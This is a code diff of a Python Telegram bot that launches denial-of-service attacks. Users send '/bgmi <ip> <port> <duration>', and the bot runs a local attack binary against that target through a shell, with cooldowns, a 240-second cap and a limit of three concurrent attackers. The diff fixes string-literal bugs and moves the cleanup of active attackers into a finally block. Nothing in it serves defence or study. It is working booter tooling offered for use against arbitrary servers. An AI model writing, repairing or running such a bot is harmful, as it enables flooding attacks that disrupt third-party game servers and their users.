@@ -1,4 +1,3 @@
-
 # === SOCKS5 Proxy Setup ===
 import requests
 from telebot import apihelper
@@ -37,7 +36,7 @@ user_attacks = {}
 user_cooldowns = {}
 user_photos = {}
 user_bans = {}
-active_attackers = set()  # Track users currently running attacks
+active_attackers = set()
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 COOLDOWN_DURATION = 60
@@ -114,51 +113,53 @@ def bgmi_command(message):
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙁𝙤𝙧𝙢𝙖𝙩: /bgmi <ip> <port> <duration>")
+            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n
+
+ ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙁𝙤𝙧𝙢𝙖𝙩: /bgmi <ip> <port> <duration>")
 
         ip, port, dur = args
         if not is_valid_ip(ip): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙄𝙋.")
         if not is_valid_port(port): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙤𝙧𝙩.")
         if not is_valid_duration(dur): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣.")
-        if int(dur) > 240: raise ValueError("⛔ 𝙈𝙖𝙭 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣: 240s.")
+        if int(dur) > 240: raise ValueError("⛔ 𝙈𝙖𝙭 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣: 240s reached, Please reduce it to perform Attack")
 
         if user_id not in EXEMPTED_USERS:
             user_attacks[user_id] += 1
             user_photos[user_id] = False
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
-        bot.send_message(message.chat.id, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙
+        bot.send_message(message.chat.id, f"""🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙
 
 REQUESTED 𝗜𝗣: {ip}
 REQUESTED 𝗣𝗼𝗿𝘁: {port}
 REQUESTED 𝗧𝗶𝗺𝗲: {dur}s
 
-📢 𝗦𝗲𝗻𝗱 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 (𝗮 𝗽𝗵𝗼𝘁𝗼) 𝗼𝗻𝗰𝗲 𝗱𝗼𝗻𝗲!")
-
+📢 𝗦𝗲𝗻𝗱 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 (𝗮 𝗽𝗵𝗼𝘁𝗼) 𝗼𝗻𝗰𝗲 𝗱𝗼𝗻𝗲!""")
 
         if user_id not in EXEMPTED_USERS and len(active_attackers) >= 3 and user_id not in active_attackers:
             bot.send_message(message.chat.id, "⚠️ Currently 3 users are attacking. Please wait until one finishes.")
             return
         active_attackers.add(user_id)
 
-        asyncio.run(run_attack_command_async(ip, int(port), int(dur), dur, user_name))
+        asyncio.run(run_attack_command_async(ip, int(port), int(dur), dur, user_name, user_id))
 
     except Exception as e:
         bot.send_message(message.chat.id, str(e))
 
-async def run_attack_command_async(ip, port, duration, user_duration, user_name):
+async def run_attack_command_async(ip, port, duration, user_duration, user_name, user_id):
     try:
         command = f"./fuck {ip} {port} {duration}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙
+        bot.send_message(CHANNEL_ID, f"""✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙
 
-        active_attackers.discard(user_id)
 𝗜𝗣: {ip}
 𝗣𝗼𝗿𝘁: {port}
-𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {user_duration}sec ")
+𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {user_duration}sec""")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")
+    finally:
+        active_attackers.discard(user_id)
 
 if __name__ == "__main__":
     logging.info("Bot is starting...")
